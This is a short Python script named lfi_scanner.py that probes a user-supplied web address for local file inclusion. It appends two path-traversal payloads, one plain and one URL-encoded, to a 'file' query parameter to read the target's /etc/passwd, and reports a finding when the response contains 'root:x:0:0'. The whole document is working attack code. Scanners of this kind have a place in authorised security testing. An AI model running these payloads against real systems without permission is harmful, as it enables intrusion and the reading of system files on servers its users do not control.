import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python lfi_scanner.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

# LFI Payloads
payloads = ["../../../../etc/passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd"]

print(f"🔍 Scanning {target_url} for LFI vulnerabilities...")

for payload in payloads:
    url = f"{target_url}?file={payload}"
    response = requests.get(url)

    if "root:x:0:0" in response.text:
        print(f"🔥 LFI Vulnerability Found: {url}")
        break
else:
    print("✅ No LFI vulnerabilities detected.")
